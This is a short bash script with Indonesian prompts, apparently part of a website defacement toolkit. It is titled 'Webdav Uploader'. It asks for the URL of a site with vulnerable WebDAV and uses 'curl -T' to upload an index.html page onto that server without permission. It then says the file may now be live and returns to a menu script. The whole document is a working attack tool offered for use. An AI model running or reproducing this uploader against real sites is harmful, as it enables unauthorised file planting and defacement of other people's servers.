#!/system/xbin/bash
biru='\033[34;1m'
hijau='\033[32;1m'
ungu='\033[35;1m'
krem='\033[36;1m'
merah='\033[31;1m'
putih='\033[37;1m'
kuning='\033[33;1m'

sh title.sh
echo "\n\n"
echo $krem "	Webdav Uploader\n"
echo $hijau "	Jika Terdapat Traceback (Suatu tulisan yang diketahui error/tidak dimengerti)\n	Maka Web Tsb Tidak Vuln!"

echo $biru
read -p "Masukan Urlnya (Yang Vuln Webdav) : " url

echo $putih
curl -T index.html $url

echo $hijau "\nFile Mungkin Telah Terupload di $url/index.html"

sleep 1
echo $kuning
read -p "[ Kembali ]" back
cd ..
sh DGC-DAV.sh
